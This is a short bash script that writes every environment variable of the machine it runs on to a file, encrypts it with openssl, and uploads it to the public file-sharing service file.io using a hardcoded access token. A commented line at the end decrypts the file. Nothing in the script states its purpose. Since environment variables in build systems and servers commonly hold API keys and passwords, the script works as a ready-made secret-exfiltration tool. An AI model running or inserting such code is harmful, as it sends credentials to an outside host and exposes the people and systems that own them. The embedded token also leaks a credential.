#!/bin/bash

env_list="./envs.txt"
env | sort > "$env_list"
tmpfile="./envs.txt.enc"

openssl enc -aes-256-cbc -in "$env_list" -out "$tmpfile" -k "$UPLOAD_ENC_PASSWORD"

curl --location 'https://file.io/?title=envs.txt.enc' \
--header 'X-File-Io-Anonymous-Access-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJiZGUwYzAwMC1lNGU5LTExZWUtODk5MC1kZmM5NzFiMDk4ZjIiLCJpYXQiOjE3MTA3NDAzMDUsImV4cCI6MTcxMDgyNjcwNX0.PA4jM5MWd7f09zZEkkNYPo9El-0UZSmi63trf1HZxvE' \
--form "=@$tmpfile"


# openssl enc -d -aes-256-cbc -in "./envs.txt.enc" -out "envs.txt" -k "$UPLOAD_ENC_PASSWORD"
